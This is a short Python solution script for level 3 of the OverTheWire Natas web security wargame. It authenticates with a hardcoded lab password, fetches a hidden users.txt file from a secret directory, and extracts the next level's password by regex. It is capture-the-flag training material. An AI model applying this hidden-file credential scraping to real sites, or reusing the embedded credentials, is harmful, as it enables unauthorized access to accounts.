import requests
import re

usrname = 'natas3'
passwd = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

url = "http://%s.natas.labs.overthewire.org/s3cr3t/users.txt" % usrname

response = requests.get(url, auth = (usrname, passwd))
content = response.text

#print(content)

print re.findall('natas4:(.*)', content)[0]
